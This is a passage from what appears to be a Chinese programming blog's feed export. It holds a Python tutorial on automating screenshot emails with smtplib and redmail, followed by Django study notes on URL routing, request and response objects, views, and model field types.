<h2 id="简单实现"><a href="#简单实现" class="headerlink" title="简单实现"></a>简单实现</h2><p>先介绍要用到的库</p>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9kb2NzLnB5dGhvbi5vcmcvMy9saWJyYXJ5L3NtdHBsaWIuaHRtbA==">smtplib</span><br>定义了SMTP客户端的使用</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9kb2NzLnB5dGhvbi5vcmcvMy9saWJyYXJ5L2VtYWlsLmV4YW1wbGVzLmh0bWw=">email</span><br>邮件的编写和简单发送</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> smtplib</span><br><span class="line"><span class="keyword">from</span> email.message <span class="keyword">import</span> EmailMessage</span><br><span class="line"></span><br><span class="line">msg = EmailMessage()</span><br><span class="line">msg[<span class="string">&#x27;From&#x27;</span>] = <span class="string">&#x27;me@outlook.com&#x27;</span>    <span class="comment"># 发送邮箱</span></span><br><span class="line">msg[<span class="string">&#x27;To&#x27;</span>] = [<span class="string">&#x27;example@outlook.com&#x27;</span>, <span class="string">&#x27;example@qq.com&#x27;</span>]   <span class="comment"># 接受邮箱</span></span><br><span class="line">password = <span class="string">&#x27;*****&#x27;</span></span><br><span class="line"></span><br><span class="line">msg[<span class="string">&#x27;Subject&#x27;</span>] = <span class="string">&#x27;This is a test email&#x27;</span>	<span class="comment"># 邮件标题</span></span><br><span class="line">msg.set_content(<span class="string">&#x27;Hello !&#x27;</span>)		<span class="comment"># 邮件内容</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> smtplib.SMTP(<span class="string">&#x27;smtp.office365.com&#x27;</span>, port=<span class="number">587</span>) <span class="keyword">as</span> smtp:</span><br><span class="line">    smtp.starttls()                     <span class="comment"># 设置连接模式为TLS</span></span><br><span class="line">    smtp.login(msg[<span class="string">&#x27;From&#x27;</span>], password)   <span class="comment"># 登录客户端</span></span><br><span class="line">    smtp.send_message(msg)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 另一种发送方式</span></span><br><span class="line">    <span class="comment"># smtp.sendmail(from_addr=f&quot;owq&lt;&#123;msg[&#x27;From&#x27;]&#125;&gt;&quot;, to_addrs=msg[&#x27;To&#x27;], msg=msg.as_string())</span></span><br></pre></td></tr></table></figure>

<p>当出现更复杂的需求出现时, 上面的代码很显然不够便捷, 这时要不就自己封装一个库, 要不就找找有没有现成的, 而<code>redmail</code>就是一个不错的选择.</p>
<h2 id="redmail-库"><a href="#redmail-库" class="headerlink" title="redmail 库"></a>redmail 库</h2><blockquote>
<p>一个高级邮件发送库, 可以快速简易的进行邮件发送.</p>
</blockquote>
<blockquote>
<p>官方文档 -&gt; <span class="exturl" data-url="aHR0cHM6Ly9yZWQtbWFpbC5yZWFkdGhlZG9jcy5pby9lbi9sYXRlc3QvaW5kZXguaHRtbA==">🚪</span></p>
</blockquote>
<h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip install redmail</span><br></pre></td></tr></table></figure>

<h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> redmail <span class="keyword">import</span> EmailSender</span><br><span class="line"></span><br><span class="line">email = EmailSender(host=<span class="string">&#x27;smtp.office365.com&#x27;</span>, port=<span class="number">587</span>,</span><br><span class="line">                    username=<span class="string">&#x27;me@outlook.com&#x27;</span>, password=<span class="string">&#x27;*****&#x27;</span>)</span><br><span class="line"></span><br><span class="line">email.send(</span><br><span class="line">    subject=<span class="string">&#x27;This is a test email&#x27;</span>,</span><br><span class="line">    sender=<span class="string">&#x27;me@outlook.com&#x27;</span>,</span><br><span class="line">    receivers=[<span class="string">&#x27;example@outlook.com&#x27;</span>, <span class="string">&#x27;example@qq.com&#x27;</span>],</span><br><span class="line">    text=<span class="string">&#x27;Hello!&#x27;</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<h2 id="一键群发"><a href="#一键群发" class="headerlink" title="一键群发"></a>一键群发</h2><h3 id="大致流程"><a href="#大致流程" class="headerlink" title="大致流程"></a>大致流程</h3><p>现在有这么一个需求:</p>
<figure class="highlight clean"><table><tr><td class="code"><pre><span class="line">截图到剪贴板-&gt;粘贴到邮件客户端-&gt;填写收件人-&gt;点击发送-&gt;关闭客户端</span><br></pre></td></tr></table></figure>

<p>我们把它优化成这样:</p>
<figure class="highlight clean"><table><tr><td class="code"><pre><span class="line">截图到剪贴板-&gt;启动脚本完成群发</span><br></pre></td></tr></table></figure>

<h3 id="构建配置"><a href="#构建配置" class="headerlink" title="构建配置"></a>构建配置</h3><p>先定义一下配置文件<code>config/email_archive.yml</code>, 有不同需求时可以通过切换配置文件来快速应用.</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># SMTP 服务配置</span></span><br><span class="line"><span class="attr">smtp:</span></span><br><span class="line">  <span class="attr">username:</span> <span class="string">me@outlook.com</span></span><br><span class="line">  <span class="attr">password:</span></span><br><span class="line">  <span class="attr">host:</span> <span class="string">smtp.office365.com</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">587</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 邮件发送配置</span></span><br><span class="line"><span class="attr">send:</span></span><br><span class="line">  <span class="comment"># 发送</span></span><br><span class="line">  <span class="attr">sender:</span> <span class="string">owq&lt;me@outlook.com&gt;</span></span><br><span class="line">  <span class="comment"># 接收</span></span><br><span class="line">  <span class="attr">receive:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">example01@outlook.com</span></span><br><span class="line">  <span class="comment"># 抄送</span></span><br><span class="line">  <span class="attr">cc:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">example02@outlook.com</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">example03@outlook.com</span></span><br><span class="line">  <span class="comment"># 密送</span></span><br><span class="line">  <span class="attr">bcc:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">example04@outlook.com</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">example05@outlook.com</span></span><br></pre></td></tr></table></figure>

<p>加载<code>yml</code>文件用的函数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> yaml</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load_yml</span>(<span class="params">conf_path:<span class="built_in">str</span></span>) -&gt; <span class="built_in">dict</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Load .yml file &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file=conf_path, mode=<span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> yaml.load(stream=f, Loader=yaml.FullLoader)</span><br></pre></td></tr></table></figure>

<h3 id="图片提取"><a href="#图片提取" class="headerlink" title="图片提取"></a>图片提取</h3><p>使用<code>PIL</code>库从剪贴板提取图片保存</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image, ImageGrab</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">save_paste_pic</span>(<span class="params">filename: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot; Save the clipboard picture &quot;&quot;&quot;</span></span><br><span class="line">    im = ImageGrab.grabclipboard()</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(im, Image.Image):</span><br><span class="line">        im.save(filename)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure>

<p><em>注: Mac 桌面环境暂不支持</em></p>
<h3 id="密文密码"><a href="#密文密码" class="headerlink" title="密文密码"></a>密文密码</h3><p>对于不想把密码保存在配置里的情况, 这里可以定义一个模拟密码输入的函数.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> msvcrt</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">input_password</span>(<span class="params">info: <span class="built_in">str</span> = <span class="string">&#x27;Password: &#x27;</span></span>) -&gt; <span class="built_in">tuple</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;shell密码输入</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    按键绑定: 回车确认, 退格删除, Esc/Ctrl+C 退出(信号为False)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    :param info: 输入提示信息, defaults to &#x27;Password: &#x27;</span></span><br><span class="line"><span class="string">    :return: 信号和输入密码</span></span><br><span class="line"><span class="string">    :rtype: tuple</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(info, end=<span class="string">&#x27;&#x27;</span>, flush=<span class="literal">True</span>)</span><br><span class="line">    pawd_arr, sing = [], <span class="literal">False</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"></span><br><span class="line">        keypad = msvcrt.getch()</span><br><span class="line">        <span class="comment"># Enter</span></span><br><span class="line">        <span class="keyword">if</span> keypad == <span class="string">b&#x27;\r&#x27;</span>:</span><br><span class="line">            msvcrt.putch(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">            sing = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="comment"># Esc or Ctrl+C</span></span><br><span class="line">        <span class="keyword">elif</span> keypad <span class="keyword">in</span> [<span class="string">b&#x27;\x1b&#x27;</span>, <span class="string">b&#x27;\x03&#x27;</span>]:</span><br><span class="line">            msvcrt.putch(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="comment"># Backspace</span></span><br><span class="line">        <span class="keyword">elif</span> keypad == <span class="string">b&#x27;\x08&#x27;</span>:</span><br><span class="line">            <span class="keyword">if</span> pawd_arr:</span><br><span class="line">                pawd_arr.pop()</span><br><span class="line">                msvcrt.putch(<span class="string">b&#x27;\b&#x27;</span>)</span><br><span class="line">                msvcrt.putch(<span class="string">b&#x27; &#x27;</span>)</span><br><span class="line">                msvcrt.putch(<span class="string">b&#x27;\b&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            pawd_arr.append(keypad)</span><br><span class="line">            msvcrt.putch(<span class="string">b&#x27;*&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> sing, <span class="string">b&#x27;&#x27;</span>.join(pawd_arr).decode()</span><br></pre></td></tr></table></figure>

<center>↓ 效果是这样子 ↓</center>

<p><img data-src="http://img.owq.world/2022/05/1749-a5c938.gif"></p>
<p><em>注: 仅适用 Windows 桌面环境</em></p>
<h3 id="封装函数"><a href="#封装函数" class="headerlink" title="封装函数"></a>封装函数</h3><p>创建<code>templates\archive_pic.html</code>编写内容模板, 便于邮件内容修改.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;h1&gt;Archive&lt;/h1&gt;</span><br><span class="line">&#123;&#123; pic &#125;&#125;</span><br></pre></td></tr></table></figure>

<p>定义下发送邮件的函数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">send_archive_email</span>(<span class="params">conf: <span class="built_in">dict</span>, img_path: <span class="built_in">str</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;加载配置发送附加图片的归档邮件</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    :param conf: 发送配置</span></span><br><span class="line"><span class="string">    :param img_path: 发送图片路径</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    email = EmailSender(**conf[<span class="string">&#x27;smtp&#x27;</span>])</span><br><span class="line">    email.set_template_paths(html=<span class="string">&#x27;templates&#x27;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        email.send(</span><br><span class="line">            **conf[<span class="string">&#x27;send&#x27;</span>],</span><br><span class="line">            subject=<span class="string">f&quot;Recorded in <span class="subst">&#123;time.strftime(<span class="string">&#x27;%b %d, %Y&#x27;</span>, time.localtime())&#125;</span>&quot;</span>,</span><br><span class="line">            html_template=<span class="string">&#x27;archive_pic.html&#x27;</span>,</span><br><span class="line">            body_images=&#123;<span class="string">&#x27;pic&#x27;</span>: img_path&#125;,</span><br><span class="line">        )</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Email send done.&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span> smtplib.SMTPAuthenticationError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Authentication unsuccessful.&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span> smtplib.SMTPDataError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;SMTP service exception, login authentication is required.&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>接下来编写一下流程, 就基本完成了~</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot; 获取剪贴板图片添加到邮件发送 &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    img_path = <span class="string">r&#x27;paste_pic.png&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> save_paste_pic(img_path):</span><br><span class="line"></span><br><span class="line">        conf = load_yml(<span class="string">r&#x27;config/email_archive.yml&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> conf[<span class="string">&#x27;smtp&#x27;</span>][<span class="string">&#x27;password&#x27;</span>]:</span><br><span class="line">            sign, password = input_password()</span><br><span class="line">            <span class="keyword">if</span> sign:</span><br><span class="line">                conf[<span class="string">&#x27;smtp&#x27;</span>][<span class="string">&#x27;password&#x27;</span>] = password</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        send_archive_email(conf, img_path)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Clipboard has no pictures!&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h3 id="快速启动"><a href="#快速启动" class="headerlink" title="快速启动"></a>快速启动</h3><p>这里使用的是<code>PowerShell</code>, 打开它的配置文件(没有需要创建).</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">code <span class="variable">$profile</span></span><br></pre></td></tr></table></figure>

<p>创建运行函数和别名</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sendArchiveEmail</span></span> &#123;</span><br><span class="line">    <span class="variable">$Pwd</span> = <span class="built_in">Get-Location</span></span><br><span class="line">    <span class="built_in">Write-Output</span> <span class="string">&#x27;Start send_archive_email.py.&#x27;</span></span><br><span class="line">    <span class="built_in">cd</span> D:\Project\auto_email &amp;&amp; python send_archive_email.py</span><br><span class="line">    <span class="built_in">cd</span> <span class="variable">$Pwd</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">New-Alias</span> <span class="built_in">send-email</span> sendArchiveEmail</span><br></pre></td></tr></table></figure>

<p>刷新终端后使用<code>send-email</code>命令就可以启动脚本了</p>
<p><img data-src="http://img.owq.world/2022/05/2134-5ee714.gif"></p>
]]></content>
      <categories>
        <category>技术记录</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>Django 视图层</title>
    <url>/80aa4d4c/</url>
    <content><![CDATA[<h2 id="URL调度器"><a href="#URL调度器" class="headerlink" title="URL调度器"></a>URL调度器</h2><h3 id="urlpatterns"><a href="#urlpatterns" class="headerlink" title="urlpatterns"></a>urlpatterns</h3><blockquote>
<p>当接收一个<code>HttpRequest</code>对象时, <code>Django</code>会自按顺序遍历<code>urlpatterns</code>进行匹配.<br>它是 <a href="https://docs.djangoproject.com/zh-hans/3.2/ref/urls/#django.urls.path"><code>django.urls.path()</code></a> 和(或) <a href="https://docs.djangoproject.com/zh-hans/3.2/ref/urls/#django.urls.re_path"><code>django.urls.re_path()</code></a> 实例的序列</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">urlpatterns = [</span><br><span class="line">    path(<span class="string">&#x27;articles/2003/&#x27;</span>, views.special_case_2003),</span><br><span class="line">    ...</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<h3 id="URL匹配"><a href="#URL匹配" class="headerlink" title="URL匹配"></a>URL匹配</h3><ul>
<li><p>变量匹配 --- <code>path()</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">path(<span class="string">&#x27;&lt;int:question_id&gt;/vote/&#x27;</span>, views.vote, name=<span class="string">&#x27;vote&#x27;</span>),</span><br></pre></td></tr></table></figure>

<ul>
<li>要捕获的部分由<code>&lt;&gt;</code>包围.</li>
<li><code>int</code>代表数据类型, 也可以是<code>str</code>.</li>
<li>默认是在路径的结尾添加<code>/</code>.</li>
</ul>
</li>
<li><p>正则匹配 --- <code>re_path()</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">re_path(<span class="string">r&#x27;^(?P&lt;question_id&gt;\d+)/vote/$&#x27;</span>, views.vote, name=<span class="string">&#x27;vote&#x27;</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li>本质上是<code>re</code>模块的封装</li>
<li><code>^</code> 和 <code>$</code> 注意加上, 防止上级路径捕获次级路径</li>
</ul>
</li>
<li><p><code>include()</code></p>
<ul>
<li><code>include()</code>可以将其他<code>urlconf</code>添加到当前的<code>urlpatterns</code>序列当中.</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">path(<span class="string">&#x27;polls/&#x27;</span>, include(<span class="string">&#x27;polls.urls&#x27;</span>)),</span><br></pre></td></tr></table></figure>

<ul>
<li><p>也可以将相同的路径前缀下后面的部分一起声明.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">path(<span class="string">&#x27;&lt;page_slug&gt;-&lt;page_id&gt;/&#x27;</span>, include([</span><br><span class="line">    path(<span class="string">&#x27;history/&#x27;</span>, views.history),</span><br><span class="line">    path(<span class="string">&#x27;edit/&#x27;</span>, views.edit),</span><br><span class="line">    path(<span class="string">&#x27;discuss/&#x27;</span>, views.discuss),</span><br><span class="line">    path(<span class="string">&#x27;permissions/&#x27;</span>, views.permissions),</span><br><span class="line">]))</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<h2 id="HttpRequest"><a href="#HttpRequest" class="headerlink" title="HttpRequest"></a>HttpRequest</h2><h3 id="属性"><a href="#属性" class="headerlink" title="属性"></a>属性</h3><ul>
<li><p><code>HttpRequest.path</code><br>当前请求路径</p>
</li>
<li><p><code>HttpRequest.body</code></p>
<p>当前请求体</p>
</li>
<li><p><code>HttpRequest.method</code><br>当前请求方法</p>
</li>
<li><p><code>HttpRequest.GET</code></p>
<p>GET携带的<code>params</code>参数</p>
</li>
<li><p><code>HttpRequest.POST</code><br>POST携带的<code>data</code>参数</p>
</li>
<li><p><code>HttpRequest.COOKIES</code><br>cookies 字典</p>
</li>
<li><p><code>HttpRequest.FILES</code><br>上传的文件</p>
</li>
<li><p><code>HttpRequest.content_type</code><br>当前传输数据类型</p>
</li>
<li><p><code>HttpRequest.session</code><br>请求的服务器信息</p>
</li>
<li><p><code>HttpRequest.META</code><br>包含了 HTTP 头文件的字典</p>
</li>
</ul>
<h3 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h3><ul>
<li><p><code>get_host()</code></p>
<p>获取请求主机</p>
</li>
</ul>
<h2 id="HttpResponse"><a href="#HttpResponse" class="headerlink" title="HttpResponse"></a>HttpResponse</h2><ul>
<li><p>模板使用</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.shortcuts <span class="keyword">import</span> render</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> render(request, <span class="string">&#x27;polls/results.html&#x27;</span>, &#123;<span class="string">&#x27;question&#x27;</span>: question&#125;)</span><br></pre></td></tr></table></figure>
</li>
<li><p>返回字符串</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.http <span class="keyword">import</span> HttpResponse</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> HttpResponse(<span class="string">&quot;Here&#x27;s the text of the Web page.&quot;</span>)</span><br></pre></td></tr></table></figure>
</li>
<li><p>返回JSON格式的字符串</p>
<blockquote>
<p>本质上和<code>HttpResponse(json.dumps(&#123;&#125;))</code>一样,, 但提供了更多功能.<br>默认只接受<code>dict</code>格式, 需要设置<code>safe</code>为<code>False</code>才能传入其它格式.</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.http <span class="keyword">import</span> JsonResponse</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> JsonResponse(&#123;<span class="string">&#x27;foo&#x27;</span>: <span class="string">&#x27;bar&#x27;</span>&#125;, safe=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>
</li>
<li><p>返回文件</p>
<blockquote>
<p>主要是 <code>Content-Disposition</code> 里的内容, 这里没有<code>Django</code>特有的语法.</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">response = HttpResponse(<span class="string">&#x27;test&#x27;</span>, headers=&#123;</span><br><span class="line">        <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/octet-stream&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Content-Disposition&#x27;</span>: <span class="string">&#x27;attachment; filename=&quot;test.txt&quot;&#x27;</span>,</span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> response</span><br></pre></td></tr></table></figure>
</li>
<li><p>返回异常</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.http <span class="keyword">import</span> Http404</span><br><span class="line"></span><br><span class="line"><span class="keyword">raise</span> Http404(<span class="string">&#x27;Page not found&#x27;</span>)</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="视图"><a href="#视图" class="headerlink" title="视图"></a>视图</h2><blockquote>
<p>简单了解下4种HTTP协议请求方式</p>
<p>GET	获取资源<br>POST	新建资源(更新资源)<br>PUT	更改资源<br>DELETE 删除资源</p>
</blockquote>
<h3 id="基于函数的视图"><a href="#基于函数的视图" class="headerlink" title="基于函数的视图"></a>基于函数的视图</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">return</span> HttpResponse(<span class="string">&quot;Hello, world. You&#x27;re at the polls index.&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>实现<code>RESTful api</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">index_get</span>(<span class="params">request</span>):</span><br><span class="line">	<span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index_post</span>(<span class="params">request</span>):</span><br><span class="line">	<span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index_put</span>(<span class="params">request</span>):</span><br><span class="line">	<span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index_delete</span>(<span class="params">request</span>):</span><br><span class="line">	<span class="keyword">pass</span></span><br></pre></td></tr></table></figure>

<p>绑定url</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">path(<span class="string">&#x27;get&#x27;</span>, views.xxx, name=<span class="string">&#x27;index_get&#x27;</span>),</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<h3 id="基于类的视图"><a href="#基于类的视图" class="headerlink" title="基于类的视图"></a>基于类的视图</h3><blockquote>
<p>不用写多个绑定, 而且层次分明, 模块开发时优选.</p>
</blockquote>
<ol>
<li><p>绑定url</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">path(<span class="string">&#x27;&#x27;</span>, views.IndexView.as_view(), name=<span class="string">&#x27;index&#x27;</span>),</span><br></pre></td></tr></table></figure>
</li>
<li><p>只需要绑定一次<code>path</code>,  会根据<code>HttpRequest.method</code>自动选择相应的处理方法.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">IndexView</span>(generic.View):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get</span>(<span class="params">self, *args, **kwargs</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">post</span>(<span class="params">self, *args, **kwargs</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">put</span>(<span class="params">self, *args, **kwargs</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">self, *args, **kwargs</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure></li>
</ol>
]]></content>
      <categories>
        <category>学习教程</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>Django</tag>
      </tags>
  </entry>
  <entry>
    <title>Django 模型层</title>
    <url>/94470483/</url>
    <content><![CDATA[<h2 id="字段类型"><a href="#字段类型" class="headerlink" title="字段类型"></a>字段类型</h2><blockquote>
<p>Django 有丰富了字段类型, 为降低学习成本, 同时也为了维护方便, 尽量使用和数据库一致的数据类型.</p>
</blockquote>
<h3 id="数字类"><a href="#数字类" class="headerlink" title="数字类"></a>数字类</h3><ul>
<li><code>IntegerField</code></li>
<li><code>BigIntField</code></li>
<li><code>FloatField</code></li>
<li><code>DecimalField</code></li>
</ul>
<h3 id="字符类"><a href="#字符类" class="headerlink" title="字符类"></a>字符类</h3><ul>
<li><p><code>CharField</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 在MySQL中对应的就是varchar, 所以必须指定长度</span></span><br><span class="line">name = models.CharField(max_length=<span class="number">200</span>)</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>TextField</code></p>
<p>遇到大的文件或图片时, 将其存放在静态资源服务器, 然后使用URI或者URL存储会更合理.</p>
</li>
</ul>
<h3 id="常用类"><a href="#常用类" class="headerlink" title="常用类"></a>常用类</h3><ul>
<li><p><code>BooleanField</code></p>
</li>
<li><p><code>DateField</code></p>
</li>
<li><p><code>DateTimeField</code></p>
</li>
<li><p><code>AutoField</code></p>
<p>没有指定主键时, 当前模型会自动将一个自增id的<code>IntegerField</code>做为主键.</p>
</li>
<li><p><code>ImageField</code><br>用来做特殊约束和校验的字段, 会校验传入数据是否图片.</p>
</li>
<li><p><code>EmailField</code></p>
<p>用来做特殊约束和校验的字段, 会校验传入数据是否邮箱地址.</p>
</li>
<li><p><code>UUIDField</code><br>一般来说, <code>uuid</code>会用作当前数据表的主键.</p>
</li>
</ul>
<h2 id="字段选项-x2F-约束"><a href="#字段选项-x2F-约束" class="headerlink" title="字段选项&#x2F;约束"></a>字段选项&#x2F;约束</h2><ul>
<li><p><code>primary_key</code><br>如果为<code>True</code>, 将当前字段设置为主键, 默认为<code>False</code>.</p>
</li>
<li><p><code>null</code></p>
<p>如果为<code>True</code>， <code>Django</code>将在数据库中存储空值为 <code>NULL</code>, 默认为 <code>False</code>.</p>
</li>
<li><p><code>blank</code><br>代表空白字符<code>&quot;&quot;</code>, 如果是<code>True</code>, 当前字段允许为空, 默认为<code>False</code></p>
<blockquote>
<p><code>null</code>是数据库上的设置, <code>blank</code>是字段验证上的设置.<br><code>blank</code>设置的字段不可以为<code>NULL</code>.</p>
</blockquote>
</li>
<li><p><code>unique</code><br>唯一约束设置, 默认为<code>False</code></p>
</li>
<li><p><code>default</code><br>设置字段默认值</p>
</li>
<li><p>时间类型</p>
<ul>
<li><p><code>auto_now</code><br>每次保存时更新字段时间为现在, 只有调用<code>Model.seve()</code>时才会生效.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">update_time = models.DateTimeField(auto_now=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>auto_now_add</code><br>第一次创建对象时设置时间.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">create_time = models.DateTimeField(auto_now_add=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<p><strong>测试一下</strong></p>
<p>创建应用</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python manage.py startapp myblog</span><br></pre></td></tr></table></figure>

<p>添加模板</p>
